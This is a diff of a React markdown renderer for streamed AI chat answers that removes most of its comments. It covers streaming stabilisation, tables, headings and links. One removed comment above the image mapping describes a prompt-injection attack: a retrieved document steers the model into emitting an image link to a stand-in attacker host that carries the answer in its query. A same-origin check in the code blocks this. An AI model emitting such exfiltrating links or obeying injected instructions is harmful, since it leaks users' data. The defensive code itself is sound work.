@@ -104,19 +104,8 @@ import {
 import { useRowActionRenderer } from './answer-block-context'
 import { MarkdownCaret, STREAMING_CARET_TAG, StreamingCaretProvider, rehypeStreamingCaret } from './streaming-caret'
 
-/** Module-level so the list keeps one identity: a new array re-parses the document. */
-/**
- * KaTeX bounded: `maxSize` caps every user-given size (a `\rule{3000em}{3000em}`
- * laid over the answer) in em, and `maxExpand` the macro expansions a hostile
- * formula can make the main thread do. `trust` stays off, so `\href` and
- * `\includegraphics` are refused.
- */
 const KATEX_OPTIONS = { throwOnError: false, maxSize: 20, maxExpand: 200 }
 const REHYPE_PLUGINS: PluggableList = [[rehypeKatex, KATEX_OPTIONS], rehypeTableShape, rehypeDirectiveShape, rehypeBindWords]
-/**
- * The last block of a text still arriving: its last table row may be
- * half-written (`table-shape.ts`, `directive-shape.ts`).
- */
 const REHYPE_PLUGINS_OPEN: PluggableList = [
   [rehypeKatex, KATEX_OPTIONS],
   [rehypeTableShape, { openTail: true }],
@@ -124,15 +113,6 @@ const REHYPE_PLUGINS_OPEN: PluggableList = [
   rehypeBindWords,
 ]
 
-/**
- * The text alignment a GFM table wrote into its delimiter row (`|---:|`).
- *
- * react-markdown hands it to the custom `th`/`td` either as the legacy `align`
- * prop or as `style.textAlign` (which of the two depends on the mdast→hast
- * version in play), and the previous components read neither — so every column
- * of every table rendered left-aligned, and the right-aligned number columns
- * the agent deliberately writes (Werte, Breiten, Fristen) lost their alignment.
- */
 function cellAlignClass(
   align: string | undefined,
   style: React.CSSProperties | undefined
@@ -153,55 +133,20 @@ function getTextFromChildren(node: ReactNode): string {
   return ''
 }
 
-/**
- * Whether a fenced code block is the one a streaming text is still writing.
- *
- * Read off the parsed node, not counted in the text: CommonMark already runs
- * an unclosed fence to the end of its container, so the block the parser hands
- * over IS the half-written one. It is still open when it ends on the last line
- * of the text and that line is not a fence closing it. Counting ``` in the raw
- * text missed a `~~~` fence and one indented inside a list item, and drew those
- * from half-written source on every token. Only the last block can be open:
- * every fence before it is complete and may be drawn while the answer is still
- * arriving (ADR-0066).
- */
 export function isOpenFence(lines: readonly string[], start: number, end: number): boolean {
   const last = lines.length
   if (end < last) return false
   const opener = lines[start - 1]?.match(/(`{3,}|~{3,})/)?.[1]
   if (!opener || end <= start) return true
-  // Container prefixes (`>`, list indentation) sit before a closing fence.
   const closer = lines[end - 1]?.match(/^[\s>]*(`{3,}|~{3,})\s*$/)?.[1]
   return !(closer && closer[0] === opener[0] && closer.length >= opener.length)
 }
 
-// Exported for its own spec. It is the one part of this module with a cost that
-// depends on the shape of the input rather than its size, so it is measured
-// directly: timing it through a React render measures the render.
-/**
- * Stabilize half-arrived markdown DURING streaming so partial syntax doesn't
- * flip the layout token-by-token.
- *
- * A GFM table whose delimiter row (`|---|`) hasn't streamed in yet — the
- * header row alone would be mis-parsed. We hold the trailing header-only table
- * lines back until the delimiter row exists, rendering them as plain text for
- * the moment (they re-parse as a table once the delimiter arrives).
- *
- * A half-arrived fence needs nothing here: CommonMark runs an unclosed fence
- * to the end of its container, so it already renders as the (small) code block
- * it will become. See {@link isOpenFence} for how the renderer knows it is open.
- *
- * This only runs while `isStreaming` is true; finalized content is passed
- * through untouched so the fully-formed markdown always wins.
- */
 export function stabilizeStreamingMarkdown(raw: string): string {
   let content = raw
 
-  // Defer a header-only GFM table (last block is table rows with no
-  // delimiter row yet). Only touch the trailing run of pipe lines.
   const lines = content.split('\n')
   let end = lines.length
-  // Skip a trailing blank line so we look at the actual last content lines.
   while (end > 0 && lines[end - 1].trim() === '') end--
   let start = end
   while (start > 0 && lines[start - 1].trim().startsWith('|')) start--
@@ -209,10 +154,6 @@ export function stabilizeStreamingMarkdown(raw: string): string {
     const tableLines = lines.slice(start, end)
     const hasDelimiterRow = tableLines.some(isDelimiterRow)
     if (!hasDelimiterRow) {
-      // Escape the leading pipes so react-markdown renders them as text, not a
-      // broken table, until the delimiter row streams in. Backslashes first:
-      // a pipe that is already escaped (`\|`) must not have its escape
-      // re-escaped, which would leave the pipe unescaped (js/incomplete-sanitization).
       for (let i = start; i < end; i++) {
         lines[i] = lines[i].replace(/\\/g, '\\\\').replace(/\|/g, '\\|')
       }
@@ -223,35 +164,19 @@ export function stabilizeStreamingMarkdown(raw: string): string {
   return closeOpenBold(holdHalfDirective(content))
 }
 
-/**
- * Hold back a directive the stream is still writing, so no `:::` or `:klas`
- * flashes as text for a frame. An opened block needs nothing: an unclosed
- * `:::check` runs to the end of the text, so its content is drawn as it
- * arrives. What cannot yet parse is the fence line itself while it is being
- * typed (colons alone, or a `[label` not yet closed), and an inline
- * `:energy-class[` whose label has not closed.
- */
 export function holdHalfDirective(content: string): string {
   const cut = content.lastIndexOf('\n') + 1
   const line = content.slice(cut)
   const fences = content.match(/^[ \t]*(```|~~~)/gm)?.length ?? 0
   if (fences % 2 === 1) return content
-  // A fence line in progress: `::`, `:::`, `:::detai`, `:::details[Was es br`.
-  // Colons alone are a closer only when a block is open, and a closer is
-  // complete as typed.
   if (/^\s*:{2,}$/.test(line)) return openContainers(content.slice(0, cut)) > 0 && /:{3}/.test(line) ? content : content.slice(0, cut)
   if (/^\s*:{3,}[A-Za-z][\w-]*\[[^\]]*$/.test(line)) return content.slice(0, cut)
-  // An opener whose `{attributes}` are still being typed: `:::cases{by=escape_le`.
   if (/^\s*:{3,}[A-Za-z][\w-]*(?:\[[^\]]*\])?\{[^}]*$/.test(line)) return content.slice(0, cut)
-  // An inline directive whose label is still open. Only the text after the
-  // line's last `]` can hold one, and only that tail is scanned: the pattern
-  // over the whole line restarts at every `:name[` on it, per token.
   const from = line.lastIndexOf(']') + 1
   const inline = /(^|[^\w:]):[A-Za-z][\w-]{0,63}\[[^\]]*$/.exec(line.slice(from))
   return inline ? content.slice(0, cut + from + inline.index + inline[1].length) : content
 }
 
-/** How many directive blocks are open at the end of `content`. */
 function openContainers(content: string): number {
   let open = 0
   for (const line of content.split('\n')) {
@@ -261,14 +186,6 @@ function openContainers(content: string): number {
   return open
 }
 
-/**
- * Close a bold phrase the last line has opened and not yet closed, so it is
- * drawn bold from its first word instead of as a raw `**` until its partner
- * arrives. An answer that opens with its verdict in bold showed nothing for
- * 0.7 s (the paced reveal waited for the closer) or a raw `**` (stream audit,
- * 2026-09). Not inside an open fence or a code span, and not in a table row,
- * which the renderer draws cell by cell.
- */
 function closeOpenBold(content: string): string {
   const fences = content.match(/^[ \t]*(```|~~~)/gm)?.length ?? 0
   if (fences % 2 === 1) return content
@@ -277,36 +194,13 @@ function closeOpenBold(content: string): string {
   if ((line.match(/`/g)?.length ?? 0) % 2 === 1) return content
   if ((line.match(/\*\*/g)?.length ?? 0) % 2 === 0) return content
   const trimmed = content.trimEnd()
-  // Nothing inside the phrase yet: `**` alone would render as a literal `****`.
   if (trimmed.endsWith('**')) return content
   return `${trimmed}**`
 }
 
-/**
- * What one render of the document knows that the element overrides need.
- *
- * ## Why a context, and not a closure
- *
- * The overrides below are handed to react-markdown as COMPONENTS, and React
- * decides whether to keep or replace a subtree by the component's identity. The
- * overrides used to be built inside the renderer, closing over the heading ids,
- * the open fence and the slot renderer, all three of which change with every
- * streamed token. So every token minted a new `h2`, a new `code`, a new slot
- * component, and React unmounted and remounted the whole answer: a drawn diagram
- * went back to its skeleton and re-queued its parse behind the mermaid lock, and
- * a card that had grown into its place grew again (ADR-0066 draws both while
- * the answer is still arriving, so both were visible every token).
- *
- * The overrides are therefore module-level and never change. What varies per
- * render travels through this context and is read INSIDE them, which re-renders
- * a consumer without replacing it.
- */
 interface MarkdownRenderState {
-  /** Smaller body text, for chat bubbles. */
   compact: boolean
-  /** The id of every heading, keyed by the source line it was written on. */
   headingIds: ReadonlyMap<number, string>
-  /** The lines of the text being rendered while it streams, else `null`. See {@link isOpenFence}. */
   streamingLines: readonly string[] | null
 }
 
@@ -320,21 +214,8 @@ const MarkdownRenderStateContext = createContext<MarkdownRenderState>({
 
 const useMarkdownRenderState = (): MarkdownRenderState => useContext(MarkdownRenderStateContext)
 
-/**
- * Whether the WHOLE text is arriving, provided once by the renderer around
- * the blocks rather than through them. As a prop of every block it made every
- * block parse again at the settle, though only a table's tally and status
- * marks draw differently once the text is complete: those read it here and
- * re-render alone, and a finished block is not parsed again.
- */
 interface MarkdownStreamState {
-  /** The whole text is still arriving (any block, not only the last). */
   streaming: boolean
-  /**
-   * This view drew the text while it arrived. An all-clear check then stays
-   * open when the stream ends: folding the table the reader was reading would
-   * shrink the page under them. The next mount collapses it.
-   */
   streamedHere: boolean
 }
 
@@ -342,16 +223,6 @@ const MarkdownStreamStateContext = createContext<MarkdownStreamState>({ streamin
 
 const useMarkdownStreamState = (): MarkdownStreamState => useContext(MarkdownStreamStateContext)
 
-/**
- * The id for one heading element. The line the heading was written on is a
- * property of the text, not of the render, so it survives a render React
- * restarts or interleaves with another instance's.
- *
- * The fallback is the id this heading carried before ids were made unique:
- * a setext heading (which the scan deliberately does not read) and a
- * heading a remark plugin invented (which has no source line) still get an
- * anchor, just not a disambiguated one.
- */
 function useHeadingId(node: ExtraProps['node'], children: ReactNode): string {
   const { headingIds } = useMarkdownRenderState()
   const line = node?.position?.start.line
@@ -359,10 +230,6 @@ function useHeadingId(node: ExtraProps['node'], children: ReactNode): string {
   return assigned ?? headingAnchorId(getTextFromChildren(children))
 }
 
-// A position a remark plugin marked for the surface to fill (see
-// `slot-context`). The renderer is read here, not captured: a surface's slot
-// renderer changes whenever its cards do, and capturing it made this a new
-// component on every such change.
 function MarkdownSlot({ index }: { index?: string }) {
   const renderSlot = useMarkdownSlotRenderer()
   const position = Number(index)
@@ -377,14 +244,6 @@ function MarkdownCode({
   ...props
 }: React.ComponentPropsWithoutRef<'code'> & ExtraProps) {
   const { streamingLines } = useMarkdownRenderState()
-  // Block code vs inline. The class alone cannot decide it: a BARE
-  // fence (``` with no language — the fence the model actually writes
-  // when it forgets the tag) reaches here with no className at all, and
-  // keying on the class rendered whole diagrams and listings as inline
-  // code, so `isMermaidFence`'s content sniff never even ran. The
-  // trailing newline is the discriminator remark itself provides: a
-  // fenced block's text is always `value + '\n'`, an inline span can
-  // never contain a newline.
   const rawContent = String(children)
   const isBlock = codeClassName?.startsWith('language-') || rawContent.includes('\n')
   const codeContent = rawContent.replace(/\n$/, '')
@@ -400,8 +259,6 @@ function MarkdownCode({
     )
   }
 
-  // A drawing, not a listing (`diagram-fence.tsx`). The fence still being
-  // written holds its place, or draws as far as it has arrived.
   const drawing = diagramFenceKind(codeClassName, codeContent)
   if (drawing) {
     const at = node?.position
@@ -435,9 +292,6 @@ function MarkdownH1({ children, node }: HeadingProps) {
 }
 
 function MarkdownH2({ children, node, id: givenId, className: givenClass }: HeadingProps) {
-  // The GFM footnote section's own heading arrives with an id and an
-  // `sr-only` class; both are kept, so its label stays out of the
-  // page and the back-references resolve.
   const derived = useHeadingId(node, children)
   const openOutline = useOpenOutline()
   const t = useTranslations(commonCopy)
@@ -447,10 +301,6 @@ function MarkdownH2({ children, node, id: givenId, className: givenClass }: Head
       className={`mb-3 mt-8 block scroll-mt-4 text-lg font-medium text-foreground hyphens-manual${givenClass ? ` ${givenClass}` : ''}`}
     >
       {openOutline ? (
-        // A long answer's way back to its section list, at every section: the
-        // reader who followed a citation into the middle of a report does not
-        // scroll to the top to find the next one. Touch only (a mouse has the
-        // scrollbar and the find bar); 44px, its own row-height beside the text.
         <span className="flex items-start justify-between gap-2">
           <span className="min-w-0">{children}</span>
           <button
@@ -491,10 +341,6 @@ function MarkdownH4({ children, node }: HeadingProps) {
   )
 }
 
-// h5/h6 need a mapping too: Tailwind's preflight strips heading sizes
-// and weights, so an unmapped level rendered as plain body text — a
-// deeply structured answer (OIB guideline → section → clause) silently
-// lost its two lowest levels of hierarchy.
 function MarkdownH5({ children, node }: HeadingProps) {
   const id = useHeadingId(node, children)
   return (
@@ -522,14 +368,11 @@ function MarkdownParagraph({ children }: React.ComponentPropsWithoutRef<'p'>) {
   )
 }
 
-// `id` forwarded for the footnote list items, which the `[^n]` links
-// point at; without it every footnote link scrolled nowhere.
 function MarkdownListItem({ children, id, node }: React.ComponentPropsWithoutRef<'li'> & ExtraProps) {
   const { compact } = useMarkdownRenderState()
   const { active, muted } = useCaseMarks(node?.properties)
   const t = useTranslations(commonCopy)
   const decided = useCasesDecision() !== null && node?.properties?.dataCaseIndex !== undefined
-  // A step of a `:::procedure` (`directive-shape.ts`).
   if (node?.properties?.dataPhase) return <StepItem node={node}>{children}</StepItem>
   if (active || muted) {
     return (
@@ -546,11 +389,6 @@ function MarkdownListItem({ children, id, node }: React.ComponentPropsWithoutRef
   )
 }
 
-/**
- * Whether a row or item is the case that holds, and whether it is muted: the
- * renderer's decision in a `by=` cases block ({@link useCasesDecision}), the
- * marks the answer wrote everywhere else.
- */
 function useCaseMarks(properties: Record<string, unknown> | undefined): { active: boolean; muted: boolean } {
   const cases = useCasesDecision()
   const index = properties?.dataCaseIndex
@@ -561,11 +399,6 @@ function useCaseMarks(properties: Record<string, unknown> | undefined): { active
   return { active: Boolean(properties?.dataActive), muted: Boolean(properties?.dataMuted) }
 }
 
-// The task-list checkbox, drawn as a status mark rather than a form
-// control: a disabled checkbox reads as a broken form, and the list
-// is a statement („done", „still owed"), not an input. The same two
-// states the Status column marks carry, with the word for readers
-// who do not see the icon.
 function MarkdownTaskMark({ type, checked }: React.ComponentPropsWithoutRef<'input'> & ExtraProps) {
   const t = useTranslations(commonCopy)
   if (type !== 'checkbox') return null
@@ -582,23 +415,14 @@ function MarkdownTaskMark({ type, checked }: React.ComponentPropsWithoutRef<'inp
   )
 }
 
-// Links — anchor hrefs scroll in-page; external hrefs open new tabs
 function MarkdownLink({ href, children, node: _node, ...rest }: React.ComponentPropsWithoutRef<'a'> & ExtraProps) {
   const renderInPageAnchor = useInPageAnchorRenderer()
   const renderInternalLink = useInternalLinkRenderer()
-  // A GFM footnote link (the `[^1]` reference and its back-reference)
-  // arrives with a data attribute and an aria-label. It is a plain
-  // in-page jump, never a citation, so it keeps both and skips the
-  // surface's own anchor renderer.
   const extra = rest as Record<string, unknown>
   const footnoteRef = extra['data-footnote-ref'] as boolean | undefined
   const footnoteBackref = extra['data-footnote-backref'] as boolean | undefined
   const isFootnote = footnoteRef !== undefined || footnoteBackref !== undefined
   if (href?.startsWith('#')) {
-    // A surface that knows what this anchor MEANS can render it itself
-    // — the chat answer turns its `[3]` into a citation with a preview.
-    // Without a provider this falls through to the plain scroll link,
-    // which is what every other markdown surface wants.
     if (renderInPageAnchor && !isFootnote) {
       return <>{renderInPageAnchor({ href, children })}</>
     }
@@ -618,9 +442,6 @@ function MarkdownLink({ href, children, node: _node, ...rest }: React.ComponentP
       </a>
     )
   }
-  // In-app links stay in the app. A surface that knows the destination
-  // may render something better than a link — the chat answer turns a
-  // model deep link into an element chip.
   if (isInternalHref(href)) {
     if (renderInternalLink) {
       return <>{renderInternalLink({ href, children })}</>
@@ -643,13 +464,6 @@ function MarkdownLink({ href, children, node: _node, ...rest }: React.ComponentP
   )
 }
 
-// Tables (GFM)
-// Zebra rows and tabular figures: the answer writes its checks,
-// comparisons and values-by-class as tables, and a column of numbers
-// or classes reads down only when the digits line up.
-// What only all of a table's rows can say (its tally, a Fundstelle
-// shared by every row, each cell's column for the stacked phone
-// layout) is settled by `rehypeTableShape` and read off the node.
 function MarkdownTable({ children, node }: React.ComponentPropsWithoutRef<'table'> & ExtraProps) {
   const t = useTranslations(commonCopy)
   const tally = parseTally(node?.properties?.dataTally)
@@ -657,16 +471,9 @@ function MarkdownTable({ children, node }: React.ComponentPropsWithoutRef<'table
   const stack = stackValue === 'true' || stackValue === 'always' ? stackValue : undefined
   const variant = tableVariant(node?.properties?.dataVariant)
   const outcomeLabel = useOutcomeLabel()
-  // Collapsed only once the block has arrived: a check that folds away while
-  // it streams would make the answer jump up under the reader.
   const { streaming, streamedHere } = useMarkdownStreamState()
   const passed =
     node?.properties?.dataCollapsed === 'true' && !streaming && !streamedHere ? Number(node.properties.dataPassCount) : 0
-  // A table still arriving draws no tally (its counts would tick and its
-  // words change per row) but holds the tally's line, so the chips fade into
-  // it when the table closes instead of pushing the rows down (`table-shape.ts`).
-  // A table that closed with no tally keeps that line where it streamed
-  // (`closed`): dropping it pulled the rows up the moment the table finished.
   const reserve = node?.properties?.dataTallyReserve
   const reserved = tally.length === 0 && (reserve === 'true' || (reserve === 'closed' && streamedHere))
   const frame = (
@@ -685,7 +492,6 @@ function MarkdownTable({ children, node }: React.ComponentPropsWithoutRef<'table
         </p>
       )}
       {reserved && (
-        // One invisible chip: the line is exactly as tall as the tally's.
         <p className="invisible flex items-center" aria-hidden="true" data-testid="status-tally-reserve">
           <Chip size="sm" variant="muted">0</Chip>
         </p>
@@ -705,10 +511,8 @@ function MarkdownTable({ children, node }: React.ComponentPropsWithoutRef<'table
   return hasCases(node) ? <CasesScope node={node}>{frame}</CasesScope> : frame
 }
 
-/** A mark arriving in a table that is still being written. */
 const CHIP_ENTER = 'animate-in fade-in-0 duration-base ease-entrance motion-reduce:animate-none'
 
-/** A tally word's tone: the renderer's own outcomes, else the status word's. */
 const outcomeTone = (word: string) =>
   word === '@pass' ? 'success' : word === '@fail' ? 'destructive' : word === '@conflict' ? 'warning' : statusTone(word)
 
@@ -721,8 +525,6 @@ function MarkdownCaption({ children, node }: React.ComponentPropsWithoutRef<'cap
   )
 }
 
-// A row that holds (`trifft zu`, `aktuell`, a `:applies` marker) is tinted;
-// in a `:::cases` the others are muted once one holds (`directive-shape.ts`).
 function MarkdownRow({ children, node }: React.ComponentPropsWithoutRef<'tr'> & ExtraProps) {
   const { active, muted } = useCaseMarks(node?.properties)
   const conflict = Boolean(node?.properties?.dataConflict)
@@ -763,9 +565,6 @@ function MarkdownHeaderCell({ children, align, style, node }: React.ComponentPro
 }
 
 function MarkdownCell({ children, align, style, node }: React.ComponentPropsWithoutRef<'td'> & ExtraProps) {
-  // Marked by `rehypeTableShape`, which knows the cell's column: only a Status
-  // column's word is a mark. Read off the cell's text alone, „open" in a
-  // Bemerkung column became a chip.
   const properties = node?.properties ?? {}
   const t = useTranslations(commonCopy)
   const cases = useCasesDecision()
@@ -790,8 +589,6 @@ function MarkdownCell({ children, align, style, node }: React.ComponentPropsWith
   const holds = decided && Number(caseIndex) === cases.match
   let content: ReactNode = children
   if (decided && properties.dataCaseStatus) {
-    // The renderer's case, not the model's word: the matched row says „trifft
-    // zu", a row the model claimed and the profile refutes is overruled.
     const claimed = Boolean(properties.dataCaseClaim)
     content = holds ? (
       <Chip size="sm" variant="success" data-testid="status-mark" data-tone="success" data-case="holds" className={cellChipClass}>
@@ -825,8 +622,6 @@ function MarkdownCell({ children, align, style, node }: React.ComponentPropsWith
         data-tone={tone}
         data-outcome={outcome ?? undefined}
         title={outcome ? getTextFromChildren(children) : undefined}
-        // A status word turns into its mark the moment its last letter is
-        // written; while the answer streams the mark fades in over the word.
         className={streaming ? `${cellChipClass} ${CHIP_ENTER}` : cellChipClass}
       >
         {outcome ? outcomeLabel(outcome, 'cell') : children}
@@ -857,24 +652,10 @@ function MarkdownCell({ children, align, style, node }: React.ComponentPropsWith
   )
 }
 
-/**
- * A cell with nothing written in it: GFM pads a row still arriving with empty
- * cells, and a table may leave one blank. The caret node holds no text, so a
- * cell holding only the caret is blank too.
- */
 const isBlankCell = (node: NonNullable<ExtraProps['node']>): boolean => node.children.every((child) => textOf(child).trim() === '')
 
-/**
- * A blank cell's line: a zero-width space, so the cell is one line tall
- * before its first word as after it. Without it a stacked row on a phone
- * grew as its cells filled (an empty title cell is its padding alone, an
- * empty value cell its label's smaller line), and every step pushed the
- * rows and the prose below it down (stream audit 2026-10). Invisible to a
- * reader and to `visibleText`, which drops it.
- */
 const BLANK_CELL_LINE = '\u200B'
 
-/** The bar a check row's value cell carries (`directive-shape.ts`), or null. */
 function valueBarOf(properties: Record<string, unknown>) {
   const value = Number(properties.dataBarValue)
   const limit = Number(properties.dataBarLimit)
@@ -906,18 +687,10 @@ function MarkdownOrderedList({ children, node }: React.ComponentPropsWithoutRef<
   return hasCases(node) ? <CasesScope node={node}>{list}</CasesScope> : list
 }
 
-/**
- * Every element override, with one identity for the life of the module. See
- * {@link MarkdownRenderStateContext} for why nothing here may be rebuilt per
- * render. Cast because `Components` is keyed by intrinsic elements and the slot
- * tag is deliberately not one of them — that is what guarantees the markdown
- * itself can never produce it.
- */
 const MARKDOWN_COMPONENTS = {
   [MARKDOWN_SLOT_TAG]: MarkdownSlot,
   [STREAMING_CARET_TAG]: MarkdownCaret,
   code: MarkdownCode,
-  // Skip default pre rendering since CodeBlock handles it
   pre: ({ children }: React.ComponentPropsWithoutRef<'pre'>) => <>{children}</>,
   h1: MarkdownH1,
   h2: MarkdownH2,
@@ -926,9 +699,6 @@ const MARKDOWN_COMPONENTS = {
   h5: MarkdownH5,
   h6: MarkdownH6,
   p: MarkdownParagraph,
-  // Lists. GFM task lists arrive with `contains-task-list` /
-  // `task-list-item` classes; forcing `list-disc` on them drew a bullet
-  // NEXT TO each checkbox, so a checklist read as two markers per row.
   ul: MarkdownUnorderedList,
   ol: MarkdownOrderedList,
   li: MarkdownListItem,
@@ -975,18 +745,8 @@ const MARKDOWN_COMPONENTS = {
   [COMPARE_ROW_TAG]: CompareRow,
   [COMPARE_LABEL_TAG]: CompareLabel,
   [COMPARE_VALUE_TAG]: CompareValue,
-  // Images: bounded, softened, and lazy. Without the mapping an image
-  // rendered at natural size with square corners and loaded eagerly —
-  // and a broken source showed the browser's raw glyph full-bleed.
-  //
-  // Only an image this origin serves is loaded. The text is the model's, and a
-  // retrieved document can steer it into `![](https://attacker/?d=<answer>)`,
-  // which the browser would fetch on render, with no click, carrying whatever
-  // the model put in the query. Any other source is drawn as a link the
-  // reader chooses to open.
   img: ({ src, alt }: React.ComponentPropsWithoutRef<'img'> & ExtraProps) =>
     typeof src === 'string' && isSameOriginPath(src) ? (
-      // `next/image` needs a configured loader per host; these are the app's own paths.
       // eslint-disable-next-line @next/next/no-img-element
       <img src={src} alt={alt ?? ''} loading="lazy" className="border-base my-3 h-auto max-w-full rounded-surface border" />
     ) : typeof src === 'string' && src ? (
@@ -998,17 +758,13 @@ const MARKDOWN_COMPONENTS = {
     ),
 } as Components
 
-/** A path this origin serves (`/api/files/…`), never a protocol-relative `//host`. */
 const isSameOriginPath = (src: string): boolean => /^\/(?![\/\\])/.test(src)
 
-/** The rehype list of every block after the first: the document's own, then the separator the whole document puts before a block. */
 const REHYPE_PLUGINS_AFTER_FIRST: PluggableList = [...REHYPE_PLUGINS, rehypeBlockSeparator]
 const REHYPE_PLUGINS_OPEN_AFTER_FIRST: PluggableList = [...REHYPE_PLUGINS_OPEN, rehypeBlockSeparator]
-/** The open block with the caret after its last word: last, so no pass before it reads the caret as text. */
 const REHYPE_PLUGINS_CARET: PluggableList = [...REHYPE_PLUGINS_OPEN, rehypeStreamingCaret]
 const REHYPE_PLUGINS_CARET_AFTER_FIRST: PluggableList = [...REHYPE_PLUGINS_OPEN_AFTER_FIRST, rehypeStreamingCaret]
 
-/** The rehype list of one block: by whether it is the first, and whether it is the open one (and carries the caret). */
 function rehypePluginsFor(first: boolean, open: boolean, caret: boolean): PluggableList {
   if (!open) return first ? REHYPE_PLUGINS : REHYPE_PLUGINS_AFTER_FIRST
   if (caret) return first ? REHYPE_PLUGINS_CARET : REHYPE_PLUGINS_CARET_AFTER_FIRST
@@ -1019,27 +775,14 @@ type FootnoteOptions = NonNullable<Options['remarkRehypeOptions']>
 
 interface MarkdownBlockViewProps {
   source: string
-  /**
-   * This block's heading ids as JSON `[line within the block, id]` pairs, or
-   * `''`. A string, so a block whose headings did not change compares equal.
-   */
   headingIds: string
   compact: boolean
-  /** The text is streaming and this is its last block: the one fence that may still be open is in it. */
   open: boolean
   remarkPlugins: PluggableList
   rehypePlugins: PluggableList
   footnoteOptions: FootnoteOptions
 }
 
-/**
- * One top-level block of the document, parsed on its own.
- *
- * Memoised on its props, each of them a string, a boolean or a list the
- * renderer keeps the identity of, so a block whose source did not change is
- * neither parsed nor reconciled again when the text after it grows. Where the
- * text is cut, and why that is safe: `markdown-blocks.ts`.
- */
 const MarkdownBlockView = memo(function MarkdownBlockView({
   source,
   headingIds,
@@ -1054,8 +797,6 @@ const MarkdownBlockView = memo(function MarkdownBlockView({
       headingIds ? new Map(JSON.parse(headingIds) as [number, string][]) : NO_HEADINGS,
     [headingIds]
   )
-  // The lines a code block's position points into, while there can be a
-  // fence still being written; trailing blank lines do not end a block.
   const streamingLines = useMemo(() => (open ? source.trimEnd().split('\n') : null), [open, source])
   const renderState = useMemo(
     (): MarkdownRenderState => ({ compact, headingIds: ids, streamingLines }),
@@ -1066,8 +807,6 @@ const MarkdownBlockView = memo(function MarkdownBlockView({
       <ReactMarkdown
         remarkPlugins={remarkPlugins}
         rehypePlugins={rehypePlugins}
-        // The footnote chrome the mdast→hast step writes on its own: named in
-        // the reader's language instead of the converter's English defaults.
         remarkRehypeOptions={footnoteOptions}
         components={MARKDOWN_COMPONENTS}
       >
@@ -1077,45 +816,19 @@ const MarkdownBlockView = memo(function MarkdownBlockView({
   )
 })
 
-/**
- * The id of every heading in the document, per block, keyed by the line
- * within the block it was written on (as {@link MarkdownBlockViewProps.headingIds}).
- *
- * Ids are unique per document — two „Bewertung" sections are `bewertung`
- * and `bewertung-2` — and that uniqueness cannot be established from inside
- * a per-heading callback, which knows nothing about the headings before it
- * and runs whenever React decides to run it, nor from inside one block. So it
- * is settled here, by a pure pass over the whole string, and the overrides
- * only look their answer up. See {@link markdownHeadings} for why every
- * counting variant of this fails.
- */
 function headingIdsByBlock(content: string, blocks: readonly MarkdownBlock[]): string[] {
   const perBlock: [number, string][][] = blocks.map(() => [])
   let at = 0
   for (const heading of markdownHeadings(content)) {
-    // `heading.line` is 1-based; a block's `line` is the 0-based index of its first line.
     while (at + 1 < blocks.length && blocks[at + 1].line < heading.line) at += 1
     perBlock[at].push([heading.line - blocks[at].line, heading.id])
   }
   return perBlock.map((entries) => (entries.length > 0 ? JSON.stringify(entries) : ''))
 }
 
-/**
- * MarkdownRenderer - Renders markdown content with shadcn-idiomatic styling
- *
- * The text is rendered block by block (`markdown-blocks.ts`), so a streamed
- * answer re-parses only the block that grew, not everything above it.
- *
- * @param content - Markdown string to render
- * @param isStreaming - Whether content is still streaming: stabilise half-arrived Markdown and hold the open fence's place
- * @param className - Additional CSS classes
- * @param compact - Use smaller text sizes for chat bubbles
- * @param remarkPlugins - Extra remark plugins, run after GFM and math
- */
 export const MarkdownRenderer: FC<MarkdownRendererProps> = memo(
   ({ content, className = '', compact = false, isStreaming = false, remarkPlugins, caret }) => {
     const t = useTranslations(commonCopy)
-    // Set during render, the documented way to derive state from a prop's history.
     const [streamedHere, setStreamedHere] = useState(isStreaming)
     if (isStreaming && !streamedHere) setStreamedHere(true)
     const footnoteOptions = useMemo(
@@ -1127,23 +840,14 @@ export const MarkdownRenderer: FC<MarkdownRendererProps> = memo(
       }),
       [t]
     )
-    // Every block but the last runs `remarkBlockContinues` first, so a plugin
-    // that acts on the document's end knows the tree it sees is not the end.
     const plugins = useMemo(() => {
-      // The dialect before the surface's own plugins, so a `[N]` inside a
-      // block, or in text a directive put back, is still a citation.
       const last: PluggableList = [remarkGfm, remarkMath, remarkDirective, remarkAnswerDirectives, ...(remarkPlugins ?? [])]
       return { last, notLast: [remarkBlockContinues, ...last] }
     }, [remarkPlugins])
-    // While streaming, run partial content through the stabilizer so a
-    // half-formed table doesn't thrash the layout token-by-token. Finalized
-    // content is rendered verbatim.
     const renderedContent = useMemo(
       () => normalizeDirectiveFences(isStreaming ? stabilizeStreamingMarkdown(content) : content),
       [isStreaming, content]
     )
-    // A text that cannot be split safely is one block: the whole document,
-    // rendered at once.
     const blocks = useMemo(
       () => splitMarkdownBlocks(renderedContent) ?? [{ source: renderedContent, line: 0 }],
       [renderedContent]
@@ -1156,13 +860,6 @@ export const MarkdownRenderer: FC<MarkdownRendererProps> = memo(
       [isStreaming, streamedHere]
     )
 
-    // `hyphens-auto`: German compounds („Brandabschnittsfläche") left a ragged
-    // right edge and, in a narrow table column, a line of their own. Only
-    // words of ten letters or more, at least four on each side of the break,
-    // and not in the section headings (h2/h3, `hyphens-manual`), which read
-    // as one phrase. The dictionary is the document's `lang`. Not `text-wrap: pretty`: Chromium
-    // re-breaks the lines above the last as words are appended, so the lines
-    // the reader has read would jitter while the answer streams.
     return (
       <StreamingCaretProvider value={withCaret ? caret : null}>
         <MarkdownStreamStateContext.Provider value={streamState}>
@@ -1173,8 +870,6 @@ export const MarkdownRenderer: FC<MarkdownRendererProps> = memo(
               const last = index === blocks.length - 1
               return (
                 <MarkdownBlockView
-                  // By position: the block the reveal is writing keeps its place,
-                  // and everything drawn in it, while it grows.
                   key={index}
                   source={block.source}
                   headingIds={headingIds[index] ?? ''}
